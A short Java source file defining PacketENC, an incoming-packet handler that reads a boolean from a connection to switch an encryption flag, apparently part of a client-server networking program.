package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketENC extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Main.encryption = Connection.readBoolean();
	}

}
